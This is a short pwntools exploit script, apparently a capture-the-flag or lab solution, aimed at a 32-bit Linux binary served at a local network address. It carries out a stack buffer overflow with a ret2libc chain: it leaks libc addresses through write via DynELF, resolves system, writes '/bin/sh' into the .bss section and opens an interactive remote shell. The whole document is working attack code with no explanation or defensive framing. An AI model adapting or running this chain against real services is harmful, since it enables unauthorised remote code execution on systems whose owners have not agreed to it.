from pwn import *
context(arch='i386', os='linux')
#conventions for pwntools ^


# our exploit so far ^
#r = process("./pwn") #executes the binary
r = remote("192.168.1.128",9999)
e = ELF("./pwn")
write_plt = e.plt['write']
write_got = e.got['write']
read_plt = e.plt['read']
bss_addr = e.bss()
vuln_addr = e.symbols['vulnerable_function']




def leak(address):
    payload1 = "A" * 140 + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(address) + p32(4)
    r.send(payload1)
    data = r.recv(4)
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data

d = DynELF(leak, elf=e)

system_addr = d.lookup('system', 'libc')
log.info("system_addr = " + hex(system_addr))

payload2 = "A" *140 + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(8)

r.send(payload2)
r.send("/bin/sh\n")
payload3 = "A" *140 + p32(system_addr) + p32(vuln_addr) + p32(bss_addr)

r.send(payload3)

r.interactive() # This just enables you to type things in to your shell :)

